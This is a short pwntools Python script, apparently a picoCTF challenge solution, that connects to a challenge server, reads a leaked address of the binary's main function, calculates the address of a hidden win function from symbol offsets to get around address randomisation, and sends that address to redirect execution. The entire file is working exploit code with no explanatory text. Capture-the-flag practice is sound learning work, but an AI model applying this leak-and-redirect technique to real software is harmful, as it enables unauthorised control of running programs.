from pwn import *

# Set up connection to the remote server
host = "rescued-float.picoctf.net"
port = 58522

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./vuln')

# p = process()
# p = gdb.debug('./vuln', '''
# b *main+163
# b *win
# continue
# ''')

p.recvuntil('main: ')

# stack address of main function
leak_main = p.recvline()
# print(leak_main)
# print(elf.sym['main'])

leak_main_int = int(leak_main, 16)
# base_address = leak_main_int - elf.sym['main']
offset = elf.sym['main'] - elf.sym['win']
win_int = leak_main_int - offset+4
win = hex(win_int)
# print(win)

payload = win

p.sendline(payload)

p.interactive()